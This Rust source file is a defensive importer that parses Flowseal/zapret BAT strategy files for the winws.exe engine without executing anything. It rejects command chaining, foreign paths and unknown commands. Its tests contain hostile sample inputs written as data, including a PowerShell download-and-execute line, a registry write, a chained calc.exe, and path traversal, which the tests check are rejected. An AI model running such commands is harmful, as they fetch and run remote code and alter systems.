//! Safe importer for Flowseal/zapret BAT strategies.
//!
//! **Nothing is ever executed.** The importer understands a small, explicit
//! subset of cmd syntax that Flowseal strategy files use:
//!
//! * `@echo off`, `echo ...`, `chcp N > nul`, `::`/`rem` comments,
//!   `setlocal`, `title`, `pause`, `exit`;
//! * `cd /d "%~dp0"`, `cd /d %BIN%`;
//! * `set "BIN=%~dp0bin\"`, `set "LISTS=%~dp0lists\"` and literal `set`s;
//! * `call service.bat status_zapret|check_updates|load_game_filter|load_user_lists`
//!   (recorded as requirements, never run);
//! * exactly one `start "title" /min "%BIN%winws.exe" ...` (or a direct
//!   `"%BIN%winws.exe" ...`) line, possibly split with `^` continuations.
//!
//! Everything else is reported as unsupported with its line number; the caller
//! must either reject the file or get explicit consent to import only the
//! supported parts. Paths are reduced to resource *names*; any value that
//! points outside the Flowseal `bin`/`lists` directories is rejected.

use crate::strategy::options::{self, Kind, Scope};
use crate::strategy::{
    slugify, Arg, ArgValue, Origin, Requirements, Rule, Source, Strategy, CURRENT_SCHEMA_VERSION,
};
use crate::{is_safe_resource_name, strategy::Engine};
use serde::{Deserialize, Serialize};
use std::collections::{BTreeMap, HashMap};

pub const MAX_BAT_SIZE: usize = 256 * 1024;

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct ImportNote {
    pub line: usize,
    pub text: String,
    pub reason: String,
}

#[derive(Debug, Clone, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct BatImport {
    pub strategy: Strategy,
    /// Informational notes (ignored-but-harmless lines, interpretations).
    pub notes: Vec<ImportNote>,
    /// Lines that were *not* imported. Non-empty means the caller must ask
    /// the user before saving.
    pub unsupported: Vec<ImportNote>,
}

#[derive(Debug, thiserror::Error, PartialEq, Eq)]
pub enum BatError {
    #[error("файл слишком большой (больше {MAX_BAT_SIZE} байт)")]
    TooLarge,
    #[error("в файле не найден запуск winws.exe")]
    NoEngine,
    #[error("строка {0}: найден второй запуск движка — поддерживается только один")]
    MultipleEngines(usize),
    #[error(
        "строка {line}: движок «{exe}» не поддерживается (ожидается winws.exe из каталога bin)"
    )]
    UnsupportedEngine { line: usize, exe: String },
    #[error("строка {line}: {msg}")]
    Syntax { line: usize, msg: String },
}

#[derive(Debug, Clone, Default)]
pub struct BatOptions {
    pub name: String,
    pub id: Option<String>,
    pub source: Option<Source>,
    pub flowseal_version: Option<String>,
    pub file: Option<String>,
}

#[derive(Debug, Clone)]
struct Token {
    text: String,
    quoted: bool,
}

const BIN: &str = "\u{1}BIN\u{1}";
const LISTS: &str = "\u{1}LISTS\u{1}";
const ROOT: &str = "\u{1}ROOT\u{1}";

fn clip(s: &str) -> String {
    let t: String = s.chars().take(160).collect();
    if t.len() < s.len() {
        format!("{t}…")
    } else {
        t
    }
}

/// Joins `^`-continued physical lines. Returns (first line number, text).
fn logical_lines(src: &str) -> Vec<(usize, String)> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut start = 0;
    for (i, raw) in src.split('\n').enumerate() {
        let line = raw.strip_suffix('\r').unwrap_or(raw);
        if cur.is_empty() {
            start = i + 1;
        }
        let trimmed = line.trim_end();
        // continuation: an odd number of trailing carets outside quotes
        let quotes = trimmed.matches('"').count();
        let carets = trimmed.len() - trimmed.trim_end_matches('^').len();
        if quotes % 2 == 0 && carets % 2 == 1 {
            cur.push_str(&trimmed[..trimmed.len() - 1]);
            cur.push(' ');
            continue;
        }
        cur.push_str(line);
        out.push((start, std::mem::take(&mut cur)));
    }
    if !cur.is_empty() {
        out.push((start, cur));
    }
    out
}

/// cmd-like tokenizer: whitespace separates outside quotes, `^x` escapes
/// outside quotes, unquoted `& | < >` are rejected (command chaining).
fn tokenize(line: &str, lineno: usize) -> Result<Vec<Token>, BatError> {
    let mut toks = Vec::new();
    let mut cur = String::new();
    let mut quoted = false;
    let mut in_q = false;
    let mut chars = line.chars().peekable();
    let mut have = false;
    while let Some(c) = chars.next() {
        if in_q {
            if c == '"' {
                in_q = false;
            } else {
                cur.push(c);
            }
            continue;
        }
        match c {
            '"' => {
                in_q = true;
                quoted = true;
                have = true;
            }
            '^' => {
                if let Some(n) = chars.next() {
                    cur.push(n);
                    have = true;
                }
            }
            '&' | '|' | '<' | '>' => {
                return Err(BatError::Syntax {
                    line: lineno,
                    msg: format!("символ «{c}» вне кавычек (перенаправление или цепочка команд) не поддерживается"),
                })
            }
            c if c.is_whitespace() => {
                if have {
                    toks.push(Token { text: std::mem::take(&mut cur), quoted });
                    quoted = false;
                    have = false;
                }
            }
            c => {
                cur.push(c);
                have = true;
            }
        }
    }
    if in_q {
        return Err(BatError::Syntax {
            line: lineno,
            msg: "незакрытая кавычка".into(),
        });
    }
    if have {
        toks.push(Token { text: cur, quoted });
    }
    Ok(toks)
}

/// Expands `%VAR%` references using the known set; unknown variables are an error.
fn expand(s: &str, vars: &HashMap<String, String>, lineno: usize) -> Result<String, BatError> {
    let mut out = String::new();
    let mut rest = s;
    while let Some(i) = rest.find('%') {
        out.push_str(&rest[..i]);
        let after = &rest[i + 1..];
        if let Some(stripped) = after.strip_prefix("~dp0") {
            out.push_str(ROOT);
            rest = stripped;
            continue;
        }
        let Some(j) = after.find('%') else {
            return Err(BatError::Syntax {
                line: lineno,
                msg: "непарный символ %".into(),
            });
        };
        let name = &after[..j];
        let key = name.to_ascii_lowercase();
        match key.as_str() {
            "bin" => out.push_str(BIN),
            "lists" => out.push_str(LISTS),
            "gamefiltertcp" => out.push_str("%GameFilterTCP%"),
            "gamefilterudp" => out.push_str("%GameFilterUDP%"),
            // Older Flowseal releases used a single %GameFilter% for both.
            "gamefilter" => out.push_str("%GameFilter%"),
            _ => match vars.get(&key) {
                Some(v) => out.push_str(v),
                None => {
                    return Err(BatError::Syntax {
                        line: lineno,
                        msg: format!("неизвестная переменная %{name}%"),
                    })
                }
            },
        }
        rest = &after[j + 1..];
    }
    out.push_str(rest);
    Ok(out
        .replace(&format!("{ROOT}bin\\"), BIN)
        .replace(&format!("{ROOT}lists\\"), LISTS))
}

enum ValueParse {
    Value(ArgValue),
    Err(String),
}

fn parse_value(
    opt: &str,
    v: &str,
    kind: Option<&Kind>,
    notes: &mut Vec<ImportNote>,
    lineno: usize,
) -> ValueParse {
    let (prefix, name) = if let Some(n) = v.strip_prefix(BIN) {
        ("bin", n)
    } else if let Some(n) = v.strip_prefix(LISTS) {
        ("lists", n)
    } else if v.contains(ROOT) {
        return ValueParse::Err(format!(
            "{opt}: путь вне каталогов bin и lists не поддерживается"
        ));
    } else {
        ("", v)
    };
    let is_fake = matches!(kind, Some(Kind::Fake { .. }));
    let is_list = matches!(kind, Some(Kind::List));
    match prefix {
        "bin" | "lists" => {
            if !is_safe_resource_name(name) {
                return ValueParse::Err(format!("{opt}: недопустимое имя файла «{}»", clip(name)));
            }
            if is_fake && prefix == "bin" {
                ValueParse::Value(ArgValue::Fake { fake: name.into() })
            } else if is_list && prefix == "lists" {
                ValueParse::Value(ArgValue::List { list: name.into() })
            } else {
                ValueParse::Err(format!(
                    "{opt}: ссылка на файл «{name}» здесь не поддерживается"
                ))
            }
        }
        _ => {
            if v.contains(['\\', '/'])
                || (v.contains(':') && v.len() > 1 && v.as_bytes()[1] == b':')
            {
                return ValueParse::Err(format!(
                    "{opt}: произвольные пути к файлам запрещены («{}»)",
                    clip(v)
                ));
            }
            // A bare file name is relative to the bin directory (Flowseal runs
            // winws with the working directory set to bin).
            if is_fake && v.ends_with(".bin") && is_safe_resource_name(v) {
                notes.push(ImportNote {
                    line: lineno,
                    text: format!("{opt}={v}"),
                    reason: "имя файла без пути интерпретировано как ресурс из bin".into(),
                });
                return ValueParse::Value(ArgValue::Fake { fake: v.into() });
            }
            if is_list && is_safe_resource_name(v) {
                return ValueParse::Value(ArgValue::List { list: v.into() });
            }
            ValueParse::Value(ArgValue::Text(v.into()))
        }
    }
}

fn is_engine_exe(t: &str) -> Option<bool> {
    let lower = t.to_ascii_lowercase();
    let bin = BIN.to_ascii_lowercase();
    let in_bin = lower == "winws.exe" || lower == format!("{bin}winws.exe");
    let flat = lower.replace(&bin, "/");
    let name = flat.rsplit(['\\', '/']).next().unwrap_or(&flat);
    match name {
        "winws.exe" => Some(in_bin),
        _ => None,
    }
}

pub fn parse_bat(src: &str, opts: &BatOptions) -> Result<BatImport, BatError> {
    if src.len() > MAX_BAT_SIZE {
        return Err(BatError::TooLarge);
    }
    let src = src.strip_prefix('\u{feff}').unwrap_or(src);
    let specs: HashMap<&'static str, options::OptionSpec> = options::option_specs()
        .into_iter()
        .map(|o| (o.name, o))
        .collect();

    let mut vars: HashMap<String, String> = HashMap::new();
    let mut notes = Vec::new();
    let mut unsupported = Vec::new();
    let mut strategy_notes = Vec::new();
    let mut req = Requirements::default();
    let mut engine: Option<(usize, Vec<Token>)> = None;

    for (lineno, line) in logical_lines(src) {
        let t = line.trim();
        if t.is_empty() {
            continue;
        }
        let lower = t.to_ascii_lowercase();
        let unsupported_line = |reason: &str, u: &mut Vec<ImportNote>| {
            u.push(ImportNote {
                line: lineno,
                text: clip(t),
                reason: reason.into(),
            })
        };

        if let Some(c) = t.strip_prefix("::") {
            let c = c.trim();
            if !c.is_empty() && !c.contains("65001") {
                strategy_notes.push(c.to_string());
            }
            continue;
        }
        if lower == "rem" || lower.starts_with("rem ") || lower.starts_with("@rem ") {
            continue;
        }
        if matches!(
            lower.as_str(),
            "@echo off" | "echo off" | "setlocal" | "endlocal" | "pause" | "exit" | "exit /b"
        ) || lower.starts_with("setlocal ")
        {
            continue;
        }
        if lower.starts_with("echo") || lower.starts_with("title ") {
            if t.contains(['>', '|', '&', '<']) {
                unsupported_line(
                    "echo/title с перенаправлением или цепочкой команд",
                    &mut unsupported,
                );
            }
            continue;
        }
        if let Some(rest) = lower.strip_prefix("chcp ") {
            let rest: Vec<&str> = rest.split_whitespace().collect();
            let ok = matches!(rest.as_slice(), [n] | [n, ">", "nul"] | [n, ">nul"] if n.bytes().all(|b| b.is_ascii_digit()))
                || (rest.len() == 2
                    && rest[0].bytes().all(|b| b.is_ascii_digit())
                    && rest[1] == ">nul");
            if !ok {
                unsupported_line("нестандартная команда chcp", &mut unsupported);
            }
            continue;
        }
        if lower.starts_with("cd ") || lower.starts_with("cd/") || lower.starts_with("pushd ") {
            let arg = lower
                .split_whitespace()
                .filter(|x| *x != "cd" && *x != "/d" && *x != "pushd")
                .collect::<Vec<_>>()
                .join(" ");
            let arg = arg.trim_matches('"');
            if !matches!(arg, "%~dp0" | "%bin%" | "%~dp0bin\\" | "%~dp0bin") {
                unsupported_line("смена каталога на нестандартный путь", &mut unsupported);
            }
            continue;
        }
        if lower.starts_with("set ") {
            let body = t[4..].trim();
            let body = body
                .strip_prefix('"')
                .and_then(|b| b.strip_suffix('"'))
                .unwrap_or(body);
            let Some((name, value)) = body.split_once('=') else {
                unsupported_line("set без присваивания", &mut unsupported);
                continue;
            };
            let key = name.trim().to_ascii_lowercase();
            if key.starts_with('/') {
                unsupported_line("set /a или set /p не поддерживается", &mut unsupported);
                continue;
            }
            match key.as_str() {
                "bin" | "lists" => {
                    let want = format!("%~dp0{key}\\");
                    if !value.eq_ignore_ascii_case(&want) {
                        return Err(BatError::Syntax {
                            line: lineno,
                            msg: format!(
                                "переменная {name} указывает не на каталог Flowseal ({})",
                                clip(value)
                            ),
                        });
                    }
                }
                "gamefilter" | "gamefiltertcp" | "gamefilterudp" => notes.push(ImportNote {
                    line: lineno,
                    text: clip(t),
                    reason: "значения игрового фильтра берутся из настроек Discord Bridge".into(),
                }),
                _ => {
                    let safe = !key.is_empty()
                        && key.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_')
                        && value.len() <= 256
                        && value
                            .bytes()
                            .all(|b| b.is_ascii_alphanumeric() || b".,_-:=+".contains(&b));
                    if safe {
                        vars.insert(key, value.to_string());
                    } else {
                        unsupported_line("set с неподдерживаемым значением", &mut unsupported);
                    }
                }
            }
            continue;
        }
        if let Some(call) = lower.strip_prefix("call ") {
            let toks: Vec<String> = call
                .split_whitespace()
                .map(|x| x.trim_matches('"').to_string())
                .collect();
            let script_ok = toks
                .first()
                .is_some_and(|s| s == "service.bat" || s == "%~dp0service.bat");
            match (script_ok, toks.get(1).map(String::as_str), toks.len()) {
                (true, Some("status_zapret"), 2) => req.tcp_timestamps = true,
                (true, Some("load_game_filter"), 2) => req.game_filter = true,
                (true, Some("load_user_lists"), 2) => req.user_lists = true,
                (true, Some("check_updates"), 2) => notes.push(ImportNote {
                    line: lineno,
                    text: clip(t),
                    reason: "проверка обновлений Flowseal выполняется самим Discord Bridge".into(),
                }),
                _ => unsupported_line("вызов внешнего скрипта не поддерживается", &mut unsupported),
            }
            continue;
        }

        // Engine invocation?
        let first_word = lower
            .split_whitespace()
            .next()
            .unwrap_or("")
            .trim_matches('"');
        let looks_engine =
            first_word == "start" || first_word.ends_with(".exe") && first_word.contains("winws");
        if lower.contains("winws") && looks_engine {
            let toks = tokenize(t, lineno)?;
            let mut idx = 0;
            if toks
                .first()
                .is_some_and(|x| !x.quoted && x.text.eq_ignore_ascii_case("start"))
            {
                idx = 1;
                if toks.get(1).is_some_and(|x| x.quoted) {
                    idx = 2; // window title
                }
                while let Some(x) = toks.get(idx) {
                    let l = x.text.to_ascii_lowercase();
                    if x.quoted || !l.starts_with('/') {
                        break;
                    }
                    if !matches!(
                        l.as_str(),
                        "/min" | "/b" | "/high" | "/abovenormal" | "/normal"
                    ) {
                        return Err(BatError::Syntax {
                            line: lineno,
                            msg: format!("ключ start {} не поддерживается", x.text),
                        });
                    }
                    idx += 1;
                }
            }
            let Some(exe_tok) = toks.get(idx) else {
                return Err(BatError::NoEngine);
            };
            let exe = expand(&exe_tok.text, &vars, lineno)?;
            match is_engine_exe(&exe) {
                Some(true) => {}
                _ => {
                    let shown = exe
                        .replace(BIN, "%BIN%")
                        .replace(LISTS, "%LISTS%")
                        .replace(ROOT, "%~dp0");
                    if shown.to_ascii_lowercase().ends_with("winws.exe")
                        || shown.to_ascii_lowercase().contains("winws")
                    {
                        return Err(BatError::UnsupportedEngine {
                            line: lineno,
                            exe: clip(&shown),
                        });
                    }
                    unsupported_line(
                        "строка упоминает winws, но не является запуском движка",
                        &mut unsupported,
                    );
                    continue;
                }
            }
            if engine.is_some() {
                return Err(BatError::MultipleEngines(lineno));
            }
            engine = Some((lineno, toks[idx + 1..].to_vec()));
            continue;
        }
        unsupported_line(
            "команда не поддерживается и не будет выполнена",
            &mut unsupported,
        );
    }

    let (eline, toks) = engine.ok_or(BatError::NoEngine)?;
    let mut global = Vec::new();
    let mut rules: Vec<Rule> = vec![Rule {
        label: None,
        enabled: true,
        args: vec![],
    }];
    let mut i = 0;
    while i < toks.len() {
        let raw = expand(&toks[i].text, &vars, eline)?;
        i += 1;
        if !raw.starts_with("--") {
            return Err(BatError::Syntax {
                line: eline,
                msg: format!("ожидался параметр --..., получено «{}»", clip(&raw)),
            });
        }
        if raw == "--new" {
            rules.push(Rule {
                label: None,
                enabled: true,
                args: vec![],
            });
            continue;
        }
        let (opt, mut value) = match raw.split_once('=') {
            Some((o, v)) => (o.to_string(), Some(v.to_string())),
            None => (raw.clone(), None),
        };
        if !opt[2..]
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-')
            || opt.len() > 64
        {
            return Err(BatError::Syntax {
                line: eline,
                msg: format!("некорректное имя параметра «{}»", clip(&opt)),
            });
        }
        let spec = specs.get(opt.as_str());
        let takes_value = !matches!(spec.map(|s| &s.kind), Some(Kind::Flag));
        if value.is_none() && takes_value {
            if let Some(next) = toks.get(i) {
                if !next.text.starts_with("--") {
                    value = Some(expand(&next.text, &vars, eline)?);
                    i += 1;
                }
            }
        }
        // %GameFilter% (single variable from older releases) → per protocol.
        if let Some(v) = value.as_mut() {
            if v.contains("%GameFilter%") {
                let rep = if opt.ends_with("udp") {
                    "%GameFilterUDP%"
                } else {
                    "%GameFilterTCP%"
                };
                *v = v.replace("%GameFilter%", rep);
            }
        }
        let arg_value = match value {
            None => None,
            Some(v) => match parse_value(&opt, &v, spec.map(|s| &s.kind), &mut notes, eline) {
                ValueParse::Value(av) => Some(av),
                ValueParse::Err(msg) => return Err(BatError::Syntax { line: eline, msg }),
            },
        };
        let arg = Arg {
            opt: opt.clone(),
            value: arg_value,
        };
        if spec.is_some_and(|s| s.scope == Scope::Global) {
            global.push(arg);
        } else {
            rules.last_mut().expect("at least one rule").args.push(arg);
        }
    }
    rules.retain(|r| !r.args.is_empty());

    let name = if opts.name.trim().is_empty() {
        "Импортированная стратегия".to_string()
    } else {
        opts.name.trim().to_string()
    };
    let id = opts.id.clone().unwrap_or_else(|| slugify(&name));
    let mut metadata = BTreeMap::new();
    if let Some(f) = &opts.file {
        metadata.insert("importedFrom".into(), f.clone());
    }
    let strategy = Strategy {
        schema_version: CURRENT_SCHEMA_VERSION,
        id,
        name,
        description: String::new(),
        source: opts.source.unwrap_or(Source::Imported),
        engine: Engine::Winws,
        origin: Origin {
            base_id: None,
            flowseal_version: opts.flowseal_version.clone(),
            file: opts.file.clone(),
        },
        requirements: req,
        global,
        rules,
        notes: strategy_notes,
        metadata,
    };
    Ok(BatImport {
        strategy,
        notes,
        unsupported,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn opts() -> BatOptions {
        BatOptions {
            name: "t".into(),
            ..Default::default()
        }
    }

    #[test]
    fn continuation_and_quotes() {
        let src = "@echo off\r\nset \"BIN=%~dp0bin\\\"\r\nstart \"zapret: %~n0\" /min \"%BIN%winws.exe\" --wf-tcp=443 ^\r\n--filter-tcp=443 --dpi-desync-fake-tls=\"%BIN%a.bin\" --dpi-desync-fake-tls=^! --new ^\r\n--filter-udp=443 --dpi-desync=fake\r\n";
        let r = parse_bat(src, &opts()).unwrap();
        assert!(r.unsupported.is_empty(), "{:?}", r.unsupported);
        assert_eq!(r.strategy.global.len(), 1);
        assert_eq!(r.strategy.rules.len(), 2);
        assert_eq!(
            r.strategy.rules[0].args[1],
            Arg::fake("--dpi-desync-fake-tls", "a.bin")
        );
        assert_eq!(
            r.strategy.rules[0].args[2],
            Arg::text("--dpi-desync-fake-tls", "!")
        );
    }

    #[test]
    fn rejects_chaining_in_engine_line() {
        let src = "\"%BIN%winws.exe\" --wf-tcp=443 & calc.exe";
        assert!(matches!(
            parse_bat(src, &opts()),
            Err(BatError::Syntax { .. })
        ));
        let src = "\"%BIN%winws.exe\" --wf-tcp=443 > C:\\out.txt";
        assert!(parse_bat(src, &opts()).is_err());
    }

    #[test]
    fn rejects_foreign_paths_and_engines() {
        assert!(parse_bat("\"C:\\evil\\winws.exe\" --wf-tcp=443", &opts()).is_err());
        assert!(parse_bat("start \"\" \"%BIN%winws2.exe\" --wf-tcp=443", &opts()).is_err());
        let src =
            "\"%BIN%winws.exe\" --wf-tcp=443 --filter-tcp=443 --hostlist=\"C:\\Windows\\x.txt\"";
        assert!(parse_bat(src, &opts()).is_err());
        let src =
            "\"%BIN%winws.exe\" --wf-tcp=443 --filter-tcp=443 --hostlist=\"%LISTS%..\\..\\x.txt\"";
        assert!(parse_bat(src, &opts()).is_err());
        let src = "set \"BIN=C:\\Temp\\\"\r\n\"%BIN%winws.exe\" --wf-tcp=443";
        assert!(parse_bat(src, &opts()).is_err());
        let src = "\"%BIN%winws.exe\" --wf-tcp=%USERPROFILE%";
        assert!(parse_bat(src, &opts()).is_err());
    }

    #[test]
    fn reports_dangerous_lines_without_running_them() {
        let src = "powershell -c \"iwr http://x | iex\"\r\nreg add HKLM\\X /f\r\nnetsh interface tcp set global timestamps=enabled\r\ncall evil.bat\r\n\"%BIN%winws.exe\" --wf-tcp=443 --filter-tcp=443 --dpi-desync=fake\r\n";
        let r = parse_bat(src, &opts()).unwrap();
        assert_eq!(r.unsupported.len(), 4);
        assert_eq!(r.unsupported[0].line, 1);
        assert_eq!(r.strategy.rules.len(), 1);
    }

    #[test]
    fn no_engine() {
        assert_eq!(
            parse_bat("@echo off\r\necho hi\r\n", &opts()).unwrap_err(),
            BatError::NoEngine
        );
    }

    #[test]
    fn legacy_gamefilter_variable() {
        let src = "set \"GameFilter=1024-65535\"\r\n\"%BIN%winws.exe\" --wf-tcp=443,%GameFilter% --wf-udp=443,%GameFilter% --filter-udp=%GameFilter% --dpi-desync=fake";
        let r = parse_bat(src, &opts()).unwrap();
        assert_eq!(
            r.strategy.global[0].text_value(),
            Some("443,%GameFilterTCP%")
        );
        assert_eq!(
            r.strategy.global[1].text_value(),
            Some("443,%GameFilterUDP%")
        );
    }
}
